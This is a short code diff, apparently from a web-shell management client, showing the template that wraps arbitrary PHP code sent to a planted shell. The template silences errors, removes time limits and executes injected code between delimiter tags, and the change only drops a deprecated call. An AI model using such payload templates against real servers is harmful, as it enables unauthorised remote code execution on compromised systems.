@@ -154,7 +154,7 @@ class PHP {
     const tag_e = '}:=-';
     const encode = this.__opts__['encode'] || 'utf8';
 
-    post['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo "${tag_s}";${post['_']};echo "${tag_e}";die();`;
+    post['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);echo "${tag_s}";${post['_']};echo "${tag_e}";die();`;
 
     // 编码处理模板
     const encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
